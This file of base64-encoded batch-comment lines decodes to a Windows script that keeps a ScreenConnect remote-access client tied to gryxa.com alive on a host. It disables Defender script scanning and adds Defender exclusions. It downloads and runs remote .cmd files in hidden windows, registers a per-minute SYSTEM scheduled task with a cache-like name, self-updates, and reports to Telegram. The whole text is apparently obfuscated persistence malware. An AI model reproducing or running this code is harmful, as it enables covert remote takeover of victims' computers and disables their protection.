::cnl4YV9zdmNfZXhpc3RzX3NraXBfaGVhbF9zdGFydF9vbmx5Pj4iJUxPRyUiDQog
::ICkNCikNCmlmICIhTkVFRF9IRUFMISI9PSIxIiBjYWxsIDpRdWV1ZUdyeXhhSGVh
::bCBIRUFMDQoNCmlmICIlRE9fREVFUCUiPT0iMSIgZWNobyBkb25lPiIlR1JZWEFf
::REVFUCUiDQplY2hvIGdyeXhhX2ZyZWV6ZV9vcl9oZWFsX2RvbmU+PiIlTE9HJSIN
::CmVjaG8gJURBVEUlICVUSU1FJSB0aWNrX2dyeXhhIG9rPSFHUllYQV9PSyEgb2Jz
::ZXJ2ZT0hT0JTRVJWRSEgZm9yY2U9IUZPUkNFX0chPj4iJVdEJVxkcm9wX3RyYWNl
::LmxvZyINCg0KOkdyeXhhQWZ0ZXINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIg
::Zm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIl
::V0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0
::ICJHUllYQV9GUD0lJUwiDQpzZXQgIkdSWVhBX09LPTAiDQpzYyBxdWVyeSAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmRzdHIgL0kgL0M6
::IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiAvQzoiQ09OVElOVUVfUEVORElO
::RyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHJlZyBxdWVyeSAiSEtM
::TVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVj
::dCBDbGllbnQgKCVHUllYQV9GUCUpIiAvdiBJbWFnZVBhdGggMj5udWwgfCBmaW5k
::c3RyIC9JICJncnl4YS5jb20iID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBz
::ZXQgIkdSWVhBX09LPTEiDQopDQpyZW0gTTUyOiBhbnkgbm9uLXNldnJ6IFJ1bm5p
::bmcgV0lUSCBncnl4YS5jb20gSW1hZ2VQYXRoIGlzIE9LDQppZiAiJUdSWVhBX09L
::JSI9PSIwIiAoDQogIGZvciAvZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4g
::KCdzYyBxdWVyeSBzdGF0ZV49IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05B
::TUU6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IicpIGRvICgNCiAgICBzZXQgIl9GUD0l
::JWEiDQogICAgc2V0ICJfRlA9IV9GUDogPSEiDQogICAgaWYgL0kgbm90ICIhX0ZQ
::ISI9PSIlS0VFUF9GUCUiIGlmIC9JIG5vdCAiIV9GUCEiPT0iJUFMVF9GUCUiICgN
::CiAgICAgIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoIV9GUCEpIiB8
::IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJTVEFSVF9QRU5ESU5HIiAvQzoi
::Q09OVElOVUVfUEVORElORyIgPm51bA0KICAgICAgaWYgbm90IGVycm9ybGV2ZWwg
::MSAoDQogICAgICAgIHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRy
::b2xTZXRcU2VydmljZXNcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCFfRlAhKSIgL3Yg
::SW1hZ2VQYXRoIDI+bnVsIHwgZmluZHN0ciAvSSAiZ3J5eGEuY29tIiA+bnVsDQog
::ICAgICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgICAgICAgIHNldCAiR1JZ
::WEFfT0s9MSINCiAgICAgICAgICBzZXQgIkdSWVhBX0ZQPSFfRlAhIg0KICAgICAg
::ICApDQogICAgICApDQogICAgKQ0KICApDQopDQppZiAiJUdSWVhBX09LJSI9PSIw
::IiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
::ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
::Y3Rpb24gZ3J5eGEtaGVhbHRoIC1Xb3JrRGlyICIlV0QlIiAyPm51bCB8IGZpbmRz
::dHIgL0kgL0IgL0M6IkhFQUxUSFl8IiB8IGZpbmRzdHIgL0kgInJ1bm5pbmc9MSIg
::Pm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCikN
::Cg0KaWYgIiVHUllYQV9PSyUiPT0iMSIgaWYgIiVHUllYQV9XQVMlIj09IjAiICgN
::CiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
::aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
::biBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAi
::Z3J5eGEtcmVzdG9yZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ0dyeXhhIFJFU1RP
::UkVEICJHcnl4YSBTY3JlZW5Db25uZWN0IGhlYWx0aHkgKHN2YyBydW5uaW5nKSIN
::CikNCmlmICIlR1JZWEFfT0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9m
::aWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmls
::ZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdE
::JSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAiZ3J5eGEtbXVzdC1mYWlsIiA+bnVs
::IDI+JjENCiAgY2FsbCA6VGdHcnl4YSBET1dOICJHcnl4YSBNVVNULVJVTiAtIHNl
::cnZpY2Ugbm90IFJ1bm5pbmcgYWZ0ZXIgaGVhbCINCikNCg0KcmVtIOKUgOKUgCBb
::SF0gcXVpZXQgZGlnZXN0IChza2lwIGhlYWx0aHkgaG9zdHMg4oCUIHdhcyBmbG9v
::ZGluZyBUZWxlZ3JhbSkg4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBz
::MSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
::aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
::biBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlID5udWwgMj4m
::MQ0Kc2V0ICJORUVEX0hCPTAiDQppZiAiJVBSSU1fT0slIj09IjAiIHNldCAiTkVF
::RF9IQj0xIg0KaWYgJUZPUkVJR05fTEVGVCUgR1RSIDAgc2V0ICJORUVEX0hCPTEi
::DQppZiAiJUdSWVhBX09LJSI9PSIwIiBzZXQgIk5FRURfSEI9MSINCmlmICIlTkVF
::RF9IQiUiPT0iMCIgKA0KICBlY2hvIGhiX3NraXBfaGVhbHRoeT4+IiVMT0clIg0K
::KSBlbHNlICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
::ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJUhCRkxBRyUnKSAtYW5kIChOZXct
::VGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVIQkZMQUcl
::JykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAzNjApeyBleGl0IDAg
::fSBlbHNlIHsgZXhpdCAxIH0iID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEg
::KA0KICAgIGVjaG8gaGI+JUhCRkxBRyUNCiAgICBwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
::ICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSBIQiAtTW9kZSBjb21wYWN0IC1C
::dWlsZCAlTU9OVkVSJSAtQ291bnQgIUNPVU5UISA+bnVsIDI+JjENCiAgICBlY2hv
::IGRpZ2VzdCBIQiBzZW50Pj4iJUxPRyUiDQogICkNCikNCg0KcmVtIOKUgOKUgCBb
::SV0gc2VsZi11cGRhdGUgYXBwbHkgKGxhc3QgdGhpbmcgdGhpcyB0aWNrKSDilIDi
::lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmICIlU0VM
::Rl9VUEQlIj09IjEiIGlmIGV4aXN0ICIlU1RBR0UlXG93bl9tb24ubmV4dCIgKA0K
::ICBjYWxsIDpSZWZ1c2VJZk1vbkJlbG93Rmxvb3IgIiVTVEFHRSVcb3duX21vbi5u
::ZXh0Ig0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gbW9uX2FwcGx5X3Jl
::ZnVzZWRfZG93bmdyYWRlIGZsb29yPSFNT05fRkxPT1IhPj4iJUxPRyUiDQogICAg
::ZGVsIC9mIC9xICIlU1RBR0UlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxDQogICkg
::ZWxzZSAoDQogICAgZWNobyBzZWxmLXVwZGF0ZSBhcHBseT4+IiVMT0clIg0KICAg
::IGF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQog
::ICAgbW92ZSAveSAiJVNUQUdFJVxvd25fbW9uLm5leHQiICIlV0QlXG93bl9tb24u
::Y21kIiA+bnVsIDI+JjENCiAgICBjYWxsIDpQYXJzZU1vbk51bSAiJVdEJVxvd25f
::bW9uLmNtZCINCiAgICBpZiAhX1BOISBHVFIgIU1PTl9GTE9PUiEgc2V0ICJNT05f
::RkxPT1I9IV9QTiEiDQogICAgY2FsbCA6U2F2ZUZsb29yDQogICkNCikNCnJlbSBr
::ZWVwIGR1YWwtcGF0aCBiYWNrdXAgaW4gc3luYyBldmVyeSB0aWNrDQppZiBub3Qg
::ZXhpc3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5udWwgMj4mMQ0KaWYgZXhpc3Qg
::IiVXRCVcb3duX21vbi5jbWQiICgNCiAgYXR0cmliIC1oIC1zIC1yICIlRVRMJVxl
::dGxfbW9uLmNtZCIgPm51bCAyPiYxDQogIGNvcHkgL3kgIiVXRCVcb3duX21vbi5j
::bWQiICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQopDQpkZWwgL2YgL3Eg
::IiVNVVRFWCUiID5udWwgMj4mMQ0KDQplY2hvIHRpY2sgZG9uZTogcHJpbT0lUFJJ
::TV9PSyUgZ3J5eGE9JUdSWVhBX09LJSBhbHQ9JUFMVF9PSyUgZm9yZWlnbj0lRk9S
::RUlHTl9MRUZUJT4+IiVMT0clIg0KZW5kbG9jYWwNCmV4aXQgL2IgMA0KDQpyZW0g
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIGhl
::bHBlcnMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQDQo6U2F2ZUZsb29yDQooDQplY2hvIE1PTl9GTE9PUj0hTU9OX0ZMT09SIQ0K
::ZWNobyBMSUJfRkxPT1I9IUxJQl9GTE9PUiENCmVjaG8gR1JZWEFfRkxPT1I9IUdS
::WVhBX0ZMT09SIQ0KKT4iJUZMT09SX0ZJTEUlIg0KZXhpdCAvYiAwDQoNCjpQYXJz
::ZU1vbk51bQ0Kc2V0ICJfUE49MCINCnNldCAiX1Q9Ig0KaWYgbm90IGV4aXN0ICIl
::fjEiIGV4aXQgL2IgMQ0KcmVtIHNwbGl0IHBhdHRlcm4gc28gdGhpcyBoZWxwZXIg
::bGluZSBpcyBub3QgbWF0Y2hlZCBieSBmaW5kc3RyIGl0c2VsZg0Kc2V0ICJfRlBB
::VD1NT04iDQpzZXQgIl9GUEFUPSFfRlBBVCFWRVI9Ig0KZm9yIC9mICJ1c2ViYWNr
::cSB0b2tlbnM9MiBkZWxpbXM9PSIgJSVWIGluIChgZmluZHN0ciAvQzoiIV9GUEFU
::ISIgIiV+MSIgMl4+bnVsYCkgZG8gc2V0ICJfVD0lJVYiDQppZiBkZWZpbmVkIF9U
::ICgNCiAgc2V0ICJfVD0hX1Q6Ij0hIg0KICBzZXQgIl9UPSFfVDogPSEiDQogIHNl
::dCAiX1BOPSFfVDpNPSEiDQopDQpzZXQgIl9GUEFUPSINCmV4aXQgL2IgMA0KDQo6
::UGFyc2VMaWJOdW0NCnNldCAiX1BOPTAiDQpzZXQgIl9UPSINCmlmIG5vdCBleGlz
::dCAiJX4xIiBleGl0IC9iIDENCnJlbSBoZWFkZXI6ICMgT1dOX0xJQiAgQlVJTEQg
::MjAyNjA4MDRMNDggIC0+IHRva2VuIDQgaXMgdmVyc2lvbiAoc3BsaXQgcGF0dGVy
::biBhdm9pZHMgc2VsZi1tYXRjaCkNCnNldCAiX0ZQQVQ9T1dOX0xJQiINCnNldCAi
::X0ZQQVQ9IV9GUEFUISAgQlVJTEQiDQpmb3IgL2YgInVzZWJhY2txIHRva2Vucz00
::IiAlJVYgaW4gKGBmaW5kc3RyIC9DOiIhX0ZQQVQhIiAiJX4xIiAyXj5udWxgKSBk
::byBzZXQgIl9UPSUlViINCmlmIGRlZmluZWQgX1QgKA0KICBzZXQgIl9UPSFfVDoi
::PSEiDQogIHNldCAiX1BOPSFfVDoqTD0hIg0KKQ0Kc2V0ICJfRlBBVD0iDQpleGl0
::IC9iIDANCg0KOlBhcnNlR3J5eGFOdW0NCnNldCAiX1BOPTAiDQpzZXQgIl9UPSIN
::CmlmIG5vdCBleGlzdCAiJX4xIiBleGl0IC9iIDENCnJlbSBoZWFkZXI6IHJlbSBP
::V05fR1JZWEEgQlVJTEQgMjAyNjA4MDRHOCAgLT4gdG9rZW4gNCBpcyB2ZXJzaW9u
::DQpzZXQgIl9GUEFUPU9XTl9HUllYQSINCnNldCAiX0ZQQVQ9IV9GUEFUISBCVUlM
::RCINCmZvciAvZiAidXNlYmFja3EgdG9rZW5zPTQiICUlViBpbiAoYGZpbmRzdHIg
::L0M6IiFfRlBBVCEiICIlfjEiIDJePm51bGApIGRvIHNldCAiX1Q9JSVWIg0KaWYg
::ZGVmaW5lZCBfVCAoDQogIHNldCAiX1Q9IV9UOiI9ISINCiAgc2V0ICJfUE49IV9U
::OipHPSEiDQopDQpzZXQgIl9GUEFUPSINCmV4aXQgL2IgMA0KDQo6UmVmdXNlSWZN
::b25CZWxvd0Zsb29yDQpjYWxsIDpQYXJzZU1vbk51bSAiJX4xIg0KaWYgIiFfUE4h
::Ij09IiIgc2V0ICJfUE49MCINCmlmICFfUE4hIExTUyAhTU9OX0ZMT09SISBleGl0
::IC9iIDENCmlmICFfUE4hIEVRVSAwIGV4aXQgL2IgMQ0KZXhpdCAvYiAwDQoNCjpS
::ZWZ1c2VJZkxpYkJlbG93Rmxvb3INCmNhbGwgOlBhcnNlTGliTnVtICIlfjEiDQpp
::ZiAiIV9QTiEiPT0iIiBzZXQgIl9QTj0wIg0KaWYgIV9QTiEgTFNTICFMSUJfRkxP
::T1IhIGV4aXQgL2IgMQ0KaWYgIV9QTiEgRVFVIDAgZXhpdCAvYiAxDQpleGl0IC9i
::IDANCg0KOlJlZnVzZUlmR3J5eGFCZWxvd0Zsb29yDQpjYWxsIDpQYXJzZUdyeXhh
::TnVtICIlfjEiDQppZiAiIV9QTiEiPT0iIiBzZXQgIl9QTj0wIg0KaWYgIV9QTiEg
::TFNTICFHUllYQV9GTE9PUiEgZXhpdCAvYiAxDQppZiAhX1BOISBFUVUgMCBleGl0
::IC9iIDENCmV4aXQgL2IgMA0KDQo6UXVldWVHcnl4YUhlYWwNCnJlbSAlMT1SRUlO
::U1RBTEx8SEVBTCDigJQgT0JTRVJWRSBibG9ja3MgUkVJTlNUQUxMIG9ubHk7IEhF
::QUwgKHN0YXJ0LzEwNjAtaSkgYWxsb3dlZA0Kc2V0ICJIRUFMTU9ERT0lfjEiDQpp
::ZiAiJUhFQUxNT0RFJSI9PSIiIHNldCAiSEVBTE1PREU9SEVBTCINCmlmIGV4aXN0
::ICIlV0QlXG9ic2VydmUuZmxhZyIgaWYgL0kgIiFIRUFMTU9ERSEiPT0iUkVJTlNU
::QUxMIiAoDQogIGVjaG8gZ3J5eGFfcmVpbnN0YWxsX2Jsb2NrZWRfT0JTRVJWRT4+
::IiVMT0clIg0KICBleGl0IC9iIDANCikNCnNldCAiQllQQVNTX1JMPTAiDQpzYyBx
::dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+
::JjENCmlmIGVycm9ybGV2ZWwgMSBzZXQgIkJZUEFTU19STD0xIg0KaWYgIiFCWVBB
::U1NfUkwhIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
::cmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJVdEJVxncnl4YV9oZWFs
::LmZsYWcnKSAtYW5kICgoKEdldC1EYXRlKS0oR2V0LUl0ZW0gJyVXRCVcZ3J5eGFf
::aGVhbC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCA5MCkp
::e2V4aXQgMX1lbHNle2V4aXQgMH0iID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVs
::IDEgKA0KICAgIGVjaG8gZ3J5eGFfaGVhbF9yYXRlX2xpbWl0ZWQ+PiIlTE9HJSIN
::CiAgICBleGl0IC9iIDANCiAgKQ0KKSBlbHNlICgNCiAgZWNobyBncnl4YV9oZWFs
::X2J5cGFzc19yYXRlX2xpbWl0XzEwNjA+PiIlTE9HJSINCikNCmVjaG8gJURBVEUl
::ICVUSU1FJSAlSEVBTE1PREUlPiIlV0QlXGdyeXhhX2hlYWwuZmxhZyINCnJlZyBh
::ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVm
::ZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVTY3JpcHRTY2Fu
::bmluZyAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
::TE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9u
::c1xQYXRocyIgL3YgIiVXRCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4m
::MQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZl
::bmRlclxFeGNsdXNpb25zXFByb2Nlc3NlcyIgL3YgIm1zaWV4ZWMuZXhlIiAvdCBS
::RUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdB
::UkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQcm9jZXNz
::ZXMiIC92ICJTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlIiAvdCBSRUdf
::RFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJl
::dm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAgLW8gIiVXRCVc
::b3duX2dyeXhhLmNtZCIgIiVPV05HUllYQSUiID5udWwgMj4mMQ0KaWYgbm90IGV4
::aXN0ICIlV0QlXG93bl9ncnl4YS5jbWQiICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10
::aW1lb3V0IDggLS1tYXgtdGltZSAyMCAtbyAiJVdEJVxvd25fZ3J5eGEuY21kIiAi
::JU9XTkdSWVhBMiUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVXRCVcZ3J5eGFfbXNp
::LmxvY2siIGRlbCAvZiAvcSAiJVdEJVxncnl4YV9tc2kubG9jayIgPm51bCAyPiYx
::DQppZiBub3QgZXhpc3QgIiVTeXN0ZW1Sb290JVxUZW1wXC51cGQiIG1rZGlyICIl
::U3lzdGVtUm9vdCVcVGVtcFwudXBkIiA+bnVsIDI+JjENCj4gIiVTeXN0ZW1Sb290
::JVxUZW1wXC51cGRcZ3J5eGFfaGVhbF9vbmNlLmNtZCIgKA0KICBlY2hvIEBlY2hv
::IG9mZg0KICBlY2hvIGNhbGwgIiVXRCVcb3duX2dyeXhhLmNtZCIgIiVXRCUiICIl
::R1JZWEFfRlAlIiAiJUtFRVBfRlAlIiAiJUFMVF9GUCUiICVIRUFMTU9ERSUgXj5e
::PiIlTE9HJSIgMl4+XiYxDQopDQp3bWljIHByb2Nlc3MgY2FsbCBjcmVhdGUgImNt
::ZC5leGUgL2MgJVN5c3RlbVJvb3QlXFRlbXBcLnVwZFxncnl4YV9oZWFsX29uY2Uu
::Y21kIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQogIHBvd2Vyc2hlbGwg
::LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLVdpbmRvd1N0eWxlIEhpZGRlbiAt
::Q29tbWFuZCAiU3RhcnQtUHJvY2VzcyBjbWQuZXhlIC1Bcmd1bWVudExpc3QgJy9j
::JywnJVN5c3RlbVJvb3QlXFRlbXBcLnVwZFxncnl4YV9oZWFsX29uY2UuY21kJyAt
::V2luZG93U3R5bGUgSGlkZGVuIiA+bnVsIDI+JjENCikNCmVjaG8gZ3J5eGFfaGVh
::bF9xdWV1ZWQgbW9kZT0lSEVBTE1PREUlPj4iJUxPRyUiDQpleGl0IC9iIDANCg0K
::OkVuc3VyZUdyeXhhV2F0Y2gNCnJlbSBNNjE6IGRvd25sb2FkICsgYXJtIGNvbnRp
::bnVvdXMgTE9PUCArIDEtbWluIFRJQ0sgYmFja3VwIHRhc2sNCmlmIG5vdCBleGlz
::dCAiJVdEJVxncnl4YV93YXRjaC5jbWQiICgNCiAgIiVDVVJMJSIgLUwgLS1zc2wt
::bm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAyMCAtbyAi
::JVdEJVxncnl4YV93YXRjaC5jbWQiICIlT1dOV0FUQ0glIiA+bnVsIDI+JjENCiAg
::aWYgbm90IGV4aXN0ICIlV0QlXGdyeXhhX3dhdGNoLmNtZCIgIiVDVVJMJSIgLUwg
::LS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDIwIC1vICIlV0QlXGdyeXhh
::X3dhdGNoLmNtZCIgIiVPV05XQVRDSDIlIiA+bnVsIDI+JjENCikNCmlmIG5vdCBl
::eGlzdCAiJVdEJVxncnl4YV93YXRjaC5jbWQiICgNCiAgZWNobyBncnl4YV93YXRj
::aF9taXNzaW5nPj4iJUxPRyUiDQogIGV4aXQgL2IgMQ0KKQ0KZmluZHN0ciAvQzoi
::R1JZWEFfV0FUQ0ggQlVJTEQiICIlV0QlXGdyeXhhX3dhdGNoLmNtZCIgPm51bCAy
::PiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hvIGdyeXhhX3dhdGNoX2JhZF9t
::YXJrZXI+PiIlTE9HJSINCiAgZXhpdCAvYiAxDQopDQpzY2h0YXNrcyAvQ3JlYXRl
::IC9UTiAiV3VjYWNoZUdyeXhhV2F0Y2giIC9UUiAiY21kLmV4ZSAvYyBcIiVXRCVc
::Z3J5eGFfd2F0Y2guY21kXCIgVElDSyIgL1NDIE1JTlVURSAvTU8gMSAvUlUgU1lT
::VEVNIC9STCBISUdIRVNUIC9GID5udWwgMj4mMQ0Kc2V0ICJORUVEX0xPT1A9MSIN
::CmlmIGV4aXN0ICIlV0QlXGdyeXhhX3dhdGNoLmhiIiAoDQogIHBvd2Vyc2hlbGwg
::LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBh
::dGggJyVXRCVcZ3J5eGFfd2F0Y2guaGInKSAtYW5kICgoKEdldC1EYXRlKS0oR2V0
::LUl0ZW0gLUxpdGVyYWxQYXRoICclV0QlXGdyeXhhX3dhdGNoLmhiJykuTGFzdFdy
::aXRlVGltZSkuVG90YWxTZWNvbmRzIC1sdCAzMCkpe2V4aXQgMH1lbHNle2V4aXQg
::MX0iID5udWwgMj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiTkVFRF9M
::T09QPTAiDQopDQppZiAiIU5FRURfTE9PUCEiPT0iMSIgKA0KICBlY2hvIGdyeXhh
::X3dhdGNoX3N0YXJ0X2xvb3A+PiIlTE9HJSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9m
::aWxlIC1Ob25JbnRlcmFjdGl2ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5k
::ICJTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3VtZW50TGlzdCAnL2MnLCdcIiVX
::RCVcZ3J5eGFfd2F0Y2guY21kXCIgTE9PUCcgLVdpbmRvd1N0eWxlIEhpZGRlbiIg
::Pm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwgMSB3bWljIHByb2Nlc3MgY2FsbCBj
::cmVhdGUgImNtZC5leGUgL2MgXCIlV0QlXGdyeXhhX3dhdGNoLmNtZFwiIExPT1Ai
::ID5udWwgMj4mMQ0KKSBlbHNlICgNCiAgZWNobyBncnl4YV93YXRjaF9sb29wX2Fs
::aXZlPj4iJUxPRyUiDQopDQpleGl0IC9iIDANCg0KOkVuc3VyZUdyeXhhTXVzdA0K
::cmVtIE01OTogc3RhcnQtb25seSB3aGVuIHN2YyBleGlzdHM7IHF1ZXVlIEhFQUwg
::b25seSBvbiBoYXJkIDEwNjAgKEc5IEhFQUwgbmV2ZXIgL3gpDQpzZXQgIkdSWVhB
::X09LPTAiDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFj
::a3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmci
::KSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVM
::Ig0Kc2V0ICJHU1ZDPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIN
::CmlmIGV4aXN0ICIlV0QlXGdyeXhhX2luc3RhbGwuY21kIiBkZWwgL2YgL3EgIiVX
::RCVcZ3J5eGFfaW5zdGFsbC5jbWQiID5udWwgMj4mMQ0Kc2MgcXVlcnkgIiVHU1ZD
::JSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAvQzoiU1RBUlRfUEVORElORyIg
::L0M6IkNPTlRJTlVFX1BFTkRJTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEg
::KA0KICByZWcgcXVlcnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNl
::cnZpY2VzXCVHU1ZDJSIgL3YgSW1hZ2VQYXRoIDI+bnVsIHwgZmluZHN0ciAvSSAi
::Z3J5eGEuY29tIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIHNl
::dCAiR1JZWEFfT0s9MSINCiAgICBlY2hvIGdyeXhhX211c3RfYWxyZWFkeV9hbGl2
::ZV9yZWxheT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQpzYyBxdWVy
::eSAiJUdTVkMlIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBl
::Y2hvIGdyeXhhX211c3Rfc3RhcnRfb25seT4+IiVMT0clIg0KICBzYyBjb25maWcg
::IiVHU1ZDJSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQogIHNjIHN0YXJ0ICIlR1NW
::QyUiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDggL25vYnJlYWsgPm51bA0KICBz
::YyBxdWVyeSAiJUdTVkMlIiB8IGZpbmRzdHIgL0kgL0M6IlJVTk5JTkciIC9DOiJT
::VEFSVF9QRU5ESU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAg
::IHJlZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2Vydmlj
::ZXNcJUdTVkMlIiAvdiBJbWFnZVBhdGggMj5udWwgfCBmaW5kc3RyIC9JICJncnl4
::YS5jb20iID5udWwNCiAgICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFf
::T0s9MSINCiAgKQ0KICBpZiAiJUdSWVhBX09LJSI9PSIwIiBlY2hvIGdyeXhhX211
::c3Rfc3ZjX2V4aXN0c19ub19oZWFsPj4iJUxPRyUiDQogIGlmICIlR1JZWEFfT0sl
::Ij09IjEiIChlY2hvIGdyeXhhX211c3RfcnVubmluZ19vaz4+IiVMT0clIikgZWxz
::ZSAoZWNobyBncnl4YV9tdXN0X3N0aWxsX2Rvd25fbm9feD4+IiVMT0clIikNCiAg
::ZXhpdCAvYiAwDQopDQplY2hvIGdyeXhhX211c3RfMTA2MF9xdWV1ZV9oZWFsPj4i
